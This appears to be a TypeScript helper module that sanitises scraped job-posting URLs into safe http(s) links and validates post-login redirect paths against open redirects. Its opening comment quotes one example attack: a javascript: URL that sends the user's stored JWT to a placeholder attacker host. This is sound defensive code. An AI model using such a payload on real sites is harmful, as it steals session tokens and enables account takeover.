/**
 * External-link safety.
 *
 * Every `source_url` rendered as an `href` originates outside this app: it is
 * read off a third-party job board by the scrapers, or produced by an LLM
 * parsing one. React escapes text content but does *not* validate `href`, so a
 * posting carrying `javascript:fetch('//attacker/'+localStorage.talentradar_token)`
 * would run on click and hand over the signed-in user's JWT.
 *
 * Only http(s) links survive `externalHref`. Anything else — a `javascript:`
 * or `data:` URL, a relative path, a malformed string — comes back `null`, and
 * callers render plain text instead of a link.
 */

export function externalHref(url: string | null | undefined): string | null {
  if (!url) return null
  try {
    const parsed = new URL(url, 'https://invalid.local')
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null
    // A relative input resolves against the placeholder base; reject those too,
    // since these fields are always meant to be absolute.
    if (parsed.hostname === 'invalid.local') return null
    return parsed.toString()
  } catch {
    return null
  }
}

/**
 * Props for an external link. `noopener` denies the opened page access to
 * `window.opener`; `noreferrer` keeps the user's current URL out of the
 * destination's referrer log.
 */
export const EXTERNAL_LINK_PROPS = {
  target: '_blank',
  rel: 'noopener noreferrer',
} as const

/**
 * A `?next=` value, if it is safe to navigate to after sign-in.
 *
 * Only a path on this site: it must start with a single "/" and contain no
 * backslash or scheme. Anything else — an absolute URL, "//host", a backslash path —
 * would turn the sign-in page into a redirector to wherever a link's author
 * chose, so it is dropped and the caller falls back to its default.
 */
export function safeNextPath(value: string | null | undefined): string | null {
  if (!value || value.length > 512) return null
  if (!value.startsWith('/') || value.startsWith('//') || value.includes('\\') || value.includes('://')) return null
  return value
}

